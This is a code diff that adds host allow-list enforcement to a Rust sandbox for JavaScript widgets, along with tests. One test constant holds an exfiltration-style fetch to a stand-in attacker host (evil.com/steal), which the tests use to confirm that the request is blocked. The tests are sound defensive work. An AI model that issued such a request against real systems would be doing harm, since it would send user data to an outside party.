@@ -2,6 +2,7 @@
 //! memory limits and a minimal host API (fetch, storage, log, time, format).
 
 mod host;
+mod permissions;
 
 use std::future::Future;
 use std::path::PathBuf;
@@ -42,6 +43,10 @@ pub struct HttpRequest {
     pub url: String,
     pub headers: Vec<(String, String)>,
     pub body: Option<String>,
+    /// Hostnames the widget may contact; set by `send`, never by widget code.
+    /// A client that follows redirects must re-check every hop against these.
+    #[serde(skip)]
+    pub allowed_hosts: Vec<String>,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
@@ -53,7 +58,7 @@ pub struct HttpResponse {
 
 pub type HttpFuture<'a> = Pin<Box<dyn Future<Output = Result<HttpResponse, String>> + Send + 'a>>;
 
-/// Performs a widget's HTTP request (the real client arrives in Task 5).
+/// Performs a widget's HTTP request.
 pub trait HttpClient: Send + Sync {
     fn send(&self, req: HttpRequest) -> HttpFuture<'_>;
 }
@@ -92,10 +97,14 @@ pub async fn run(ctx: RunContext) -> Result<Output, RunError> {
         .map_err(|e| RunError::Script(format!("cannot read widget.js: {e}")))?;
     let storage = Arc::new(Mutex::new(host::Storage::load(ctx.storage_path.clone())));
     let limits = ctx.limits;
+    let violation = Arc::new(Mutex::new(None));
 
-    let result = tokio::time::timeout(limits.timeout, execute(&ctx, source, storage.clone()))
-        .await
-        .unwrap_or(Err(RunError::Timeout));
+    let result = tokio::time::timeout(
+        limits.timeout,
+        execute(&ctx, source, storage.clone(), violation.clone()),
+    )
+    .await
+    .unwrap_or(Err(RunError::Timeout));
 
     if let Err(e) = storage.lock().unwrap().save_if_dirty() {
         log::warn!("[{}] could not save storage: {e}", ctx.instance_id);
@@ -113,6 +122,7 @@ async fn execute(
     ctx: &RunContext,
     source: String,
     storage: Arc<Mutex<host::Storage>>,
+    violation: Violation,
 ) -> Result<Option<String>, RunError> {
     let script_err = |e: rquickjs::Error| RunError::Script(e.to_string());
     let rt = AsyncRuntime::new().map_err(script_err)?;
@@ -132,11 +142,13 @@ async fn execute(
 
     let instance_id = ctx.instance_id.clone();
     let http = ctx.http.clone();
+    let allowed = ctx.manifest.permissions.network.clone();
+    let seen = violation.clone();
     let settings = Value::Object(ctx.settings.clone()).to_string();
     js.async_with(async move |ctx| {
         let result: rquickjs::Result<Option<String>> = async {
             host::install(&ctx, storage, instance_id)?;
-            install_fetch(&ctx, http)?;
+            install_fetch(&ctx, http, allowed, seen)?;
             let invoke: Function = ctx.eval(PRELUDE)?;
             let (module, loaded) = Module::declare(ctx.clone(), "widget.js", source)?.eval()?;
             loaded.into_future::<()>().await?;
@@ -145,13 +157,18 @@ async fn execute(
             pending.into_future::<Option<String>>().await
         }
         .await;
-        result.map_err(|e| classify(&ctx, e, &interrupted))
+        result.map_err(|e| classify(&ctx, e, &interrupted, &violation))
     })
     .await
 }
 
 /// Maps an engine error to a `RunError`, telling limits apart from script bugs.
-fn classify(ctx: &Ctx<'_>, err: rquickjs::Error, interrupted: &AtomicBool) -> RunError {
+fn classify(
+    ctx: &Ctx<'_>,
+    err: rquickjs::Error,
+    interrupted: &AtomicBool,
+    violation: &Violation,
+) -> RunError {
     if matches!(err, rquickjs::Error::Allocation) {
         return RunError::OutOfMemory;
     }
@@ -160,23 +177,52 @@ fn classify(ctx: &Ctx<'_>, err: rquickjs::Error, interrupted: &AtomicBool) -> Ru
         RunError::Timeout
     } else if message.contains("out of memory") {
         RunError::OutOfMemory
+    } else if let Some(v) = violation
+        .lock()
+        .unwrap()
+        .as_ref()
+        .filter(|v| message.contains(*v))
+    {
+        RunError::Permission(v.clone())
     } else {
         RunError::Script(message)
     }
 }
 
+/// The last permission violation a fetch raised; lets an uncaught rejection
+/// be reported as `RunError::Permission` instead of a plain script error.
+type Violation = Arc<Mutex<Option<String>>>;
+
 /// Installs the hidden `__host_fetch(reqJson) -> Promise<respJson>`.
-fn install_fetch<'js>(ctx: &Ctx<'js>, http: Arc<dyn HttpClient>) -> rquickjs::Result<()> {
+fn install_fetch<'js>(
+    ctx: &Ctx<'js>,
+    http: Arc<dyn HttpClient>,
+    allowed: Vec<String>,
+    violation: Violation,
+) -> rquickjs::Result<()> {
     let fetch = Function::new(
         ctx.clone(),
         Async(move |ctx: Ctx<'js>, req: String| {
             let http = http.clone();
+            let allowed = allowed.clone();
+            let violation = violation.clone();
             async move {
                 let req: HttpRequest = serde_json::from_str(&req)
                     .map_err(|e| Exception::throw_type(&ctx, &format!("fetch: {e}")))?;
-                let resp = send(http.as_ref(), req)
-                    .await
-                    .map_err(|e| Exception::throw_message(&ctx, &format!("fetch failed: {e}")))?;
+                let resp = match send(http.as_ref(), req, &allowed).await {
+                    Ok(resp) => resp,
+                    Err(SendError::Denied(msg)) => {
+                        log::warn!("blocked widget request: {msg}");
+                        *violation.lock().unwrap() = Some(msg.clone());
+                        return Err(Exception::throw_type(&ctx, &msg));
+                    }
+                    Err(SendError::Failed(e)) => {
+                        return Err(Exception::throw_message(
+                            &ctx,
+                            &format!("fetch failed: {e}"),
+                        ));
+                    }
+                };
                 serde_json::to_string(&resp)
                     .map_err(|e| Exception::throw_message(&ctx, &format!("fetch: {e}")))
             }
@@ -185,9 +231,21 @@ fn install_fetch<'js>(ctx: &Ctx<'js>, http: Arc<dyn HttpClient>) -> rquickjs::Re
     ctx.globals().set("__host_fetch", fetch)
 }
 
-/// Every widget request goes through here (Task 5 adds the allow-list check).
-async fn send(http: &dyn HttpClient, req: HttpRequest) -> Result<HttpResponse, String> {
-    http.send(req).await
+enum SendError {
+    /// The URL is not on the widget's allow-list.
+    Denied(String),
+    Failed(String),
+}
+
+/// Every widget request goes through here: the allow-list is checked first.
+async fn send(
+    http: &dyn HttpClient,
+    mut req: HttpRequest,
+    allowed: &[String],
+) -> Result<HttpResponse, SendError> {
+    permissions::check_url(&req.url, allowed).map_err(SendError::Denied)?;
+    req.allowed_hosts = allowed.to_vec();
+    http.send(req).await.map_err(SendError::Failed)
 }
 
 #[cfg(test)]
@@ -219,6 +277,17 @@ mod tests {
         settings: Map<String, Value>,
         limits: Limits,
         http_body: String,
+        network: Vec<String>,
+        http: Option<Arc<dyn HttpClient>>,
+    }
+
+    /// An HTTP client whose requests never complete.
+    struct HangHttp;
+
+    impl HttpClient for HangHttp {
+        fn send(&self, _req: HttpRequest) -> HttpFuture<'_> {
+            Box::pin(std::future::pending())
+        }
     }
 
     impl Fixture {
@@ -230,6 +299,8 @@ mod tests {
                 settings: Map::new(),
                 limits: Limits::default(),
                 http_body: "{}".into(),
+                network: Vec::new(),
+                http: None,
             }
         }
 
@@ -238,16 +309,22 @@ mod tests {
         }
 
         fn ctx(&self) -> RunContext {
-            let manifest: Manifest =
-                serde_json::from_value(json!({"id": "test", "name": "Test", "formatVersion": 1}))
-                    .unwrap();
+            let manifest: Manifest = serde_json::from_value(json!({
+                "id": "test",
+                "name": "Test",
+                "formatVersion": 1,
+                "permissions": {"network": self.network},
+            }))
+            .unwrap();
             RunContext {
                 manifest: Arc::new(manifest),
                 widget_dir: self.dir.path().to_path_buf(),
                 instance_id: "inst-1".into(),
                 settings: self.settings.clone(),
-                http: Arc::new(FakeHttp {
-                    body: self.http_body.clone(),
+                http: self.http.clone().unwrap_or_else(|| {
+                    Arc::new(FakeHttp {
+                        body: self.http_body.clone(),
+                    })
                 }),
                 storage_path: self.storage_path(),
                 limits: self.limits,
@@ -434,6 +511,7 @@ mod tests {
              const j = await r.json(); return [r.ok, r.status, j.url].join(\",\"); })()",
         ));
         f.http_body = r#"{"url": "{url}"}"#.into();
+        f.network = vec!["api.example.com".into()];
         assert_eq!(
             text(&f.run().await.unwrap()),
             "true,200,https://api.example.com/x"
@@ -446,5 +524,48 @@ mod tests {
             "(() => { console.log(\"a\", 1, { b: 2 }); log(\"c\"); return \"logged\"; })()",
         ));
         assert_eq!(text(&f.run().await.unwrap()), "logged");
+    }
+
+    const UNDECLARED_FETCH: &str = "await fetch(\"https://evil.com/steal\")";
+
+    #[tokio::test]
+    async fn undeclared_fetch_rejects_promise_in_js() {
+        let mut f = Fixture::new(&returning(&format!(
+            "await (async () => {{ try {{ {UNDECLARED_FETCH}; return \"fetched\"; }}              catch (e) {{ return e.name + \": \" + e.message; }} }})()"
+        )));
+        f.network = vec!["api.example.com".into()];
+        let out = f.run().await.unwrap();
+        assert!(
+            text(&out).contains("host not allowed: evil.com"),
+            "{}",
+            text(&out)
+        );
+        assert!(text(&out).starts_with("TypeError"), "{}", text(&out));
+    }
+
+    #[tokio::test]
+    async fn uncaught_undeclared_fetch_is_permission_error() {
+        let mut f = Fixture::new(&format!(
+            "export default async function update() {{ {UNDECLARED_FETCH}; return {{ blocks: [] }}; }}"
+        ));
+        f.network = vec!["api.example.com".into()];
+        match f.run().await {
+            Err(RunError::Permission(m)) => {
+                assert!(m.contains("host not allowed: evil.com"), "{m}")
+            }
+            other => panic!("expected Permission error, got {other:?}"),
+        }
+    }
+
+    #[tokio::test]
+    async fn timeout_during_pending_fetch() {
+        let mut f = Fixture::new(&returning("await fetch(\"https://api.example.com/slow\")"));
+        f.network = vec!["api.example.com".into()];
+        f.http = Some(Arc::new(HangHttp));
+        f.limits.timeout = Duration::from_millis(200);
+        let start = Instant::now();
+        let res = f.run().await;
+        assert!(matches!(res, Err(RunError::Timeout)), "{res:?}");
+        assert!(start.elapsed() < Duration::from_secs(5));
     }
 }
